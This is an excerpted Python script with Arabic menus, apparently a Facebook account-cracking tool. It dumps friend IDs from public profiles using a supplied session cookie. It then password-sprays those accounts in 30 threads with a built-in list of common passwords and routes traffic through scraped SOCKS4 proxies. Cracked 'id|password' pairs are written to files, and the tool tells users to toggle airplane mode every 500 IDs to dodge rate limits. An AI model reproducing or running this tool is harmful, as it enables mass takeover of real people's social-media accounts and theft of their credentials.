...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt').text
		ua=open('.bbnew.txt','w')
...
#BANNERdef banner():                
	...
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97m ﺩﺎﻬﺟ ﺓﺩﺍ ﻱ ﻚﺑ ﺎﺒﺣﺮﻣ\33[0;1m')
	print ('')
...
║ Version  : 0.1                   
║ FILENAME : jehad pro  2                    
╚══════════════════════════════════════════╝

"""%(P))

def linex():
	print("%s════════════════════ ﻲﻗﻼﺧﺍ ﺮﻴﻏ ﻑﺮﺼﺗ ﻱﺍ ﻰﻠﻋ ﻝﺆﺴﻣ ﺮﻴﻏ ﺎﻧﺍ══════════════════%s\n"%(P,P))
os.system("clear")
banner()
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m  ﻚﻴﺑ ﺹﺎﺨﻟﺍ ﻱﺩ ﻱﻻﺍ : \033[94m"+id) 
  try: 
    httpCaht = requests.get("https://pastebin.com/raw/LKbzwft9").text 
    if id in httpCaht: 
...
def login_lagi334():
	banner()
	try:
		cookie=input("%s [●] ﻲﻤﻫﻭ ﺏﺎﺴﺣ ﻦﻣ ﺲﻴﻛﻮﻜﻟﺍ ﻒﺿﺍ %s"%(P,P))
		linex()
...
def menu(my_name,my_id):
	...
	print('%s[%s03%s] %sﻲﺑ ﺔﺻﺎﺨﻟﺍ ﻡﺍﺮﺠﻴﻠﺘﻟﺍ ﺓﺎﻨﻗ ﻰﻟﺇ ﻢﻀﻧﺍ%s'%(P,P,P,P,P));time.sleep(0.02)
...
def dump_publik():
	...
	pil = input(P+'['+P+'●'+P+'] ﻡﺎﻋ ﻪﺋﺎﻗﺪﺻﺍ ﺏﺎﺴﺣ ﻱﺩ ﻱﺍ ﻂﺣ ● ')
	try:
		...
		print('# ﺊﻴﺳ ﺖﻧﺮﺘﻧﺍ ﻝﺎﺼﺗﺍ')
		exit()
	except (KeyError,IOError):
		print('# ﻡﺎﻋ ﺲﻴﻟ ﻭﺍ ﺢﻴﺤﺻ ﺮﻴﻏ ﻱﺩ ﻱﻻﺍ')
		exit()
...
def multidump():
	...
	for mnh in range(nanya_keun):
		...
		try:
			...
			print('\n [×] ﻩﺮﻴﻐﺘﺑ ﻢﻗ ﻱﺪﻳﻻﺍ ﻰﻠﻋ ﺭﻮﺜﻌﻟﺍ ﻢﺘﻳ ﻢﻟ ، ﻱﺩ ﻱﻻﺍ ﻰﻠﻋ ﻝﻮﺼﺤﻟﺍ ﻲﻓ ﺄﻄﺧ');multidump()
	print()
...
def setting():
	...
	teks = '[01] ﻪﻤﻳﺪﻘﻟﺍ ﺀﺎﻗﺪﺻﻻﺍ ﺕﺎﺑﺎﺴﺣ ﻦﻴﻤﺨﺗ\n[02] ﺓﺪﻳﺪﺠﻟﺍ ﺀﺎﻗﺪﺻﻻﺍ ﺕﺎﺑﺎﺴﺣ ﻦﻴﻤﺨﺗ\n[03] ﺕﺎﺑﺎﺴﺤﻟﺍ ﻊﻴﻤﺟ ﻰﻠﻋ ﻦﻴﻤﺨﺗ'
...
def passwrd():
	...
	krek = '[•] ﻲﻓ ﺞﺋﺎﺘﻨﻟﺍ ﻆﻔﺣ ﻢﺘﻳ : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
	cetak(nel(krek, title=' • CRACK • '))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['1122334455','1234554321','112233445566','123456654321','123asd123','asd123','123asd','1122334455667788','100200300','abc123','qwerty','111111','123123']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# ﻦﻴﻤﺨﺘﻟﺍ ﺕﻻﻮﺤﻣ ﺕﺍﺭﺎﻴﺧ ﺭﺎﻬﻇﺇ ﺪﻳﺮﺗ ? (y/t)'
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}[ﻢﺗ] {idf} | {pw}{N}')
				open('ﻢﺗ/'+okc,'a').write(idf+'|'+pw+'\n')
				break
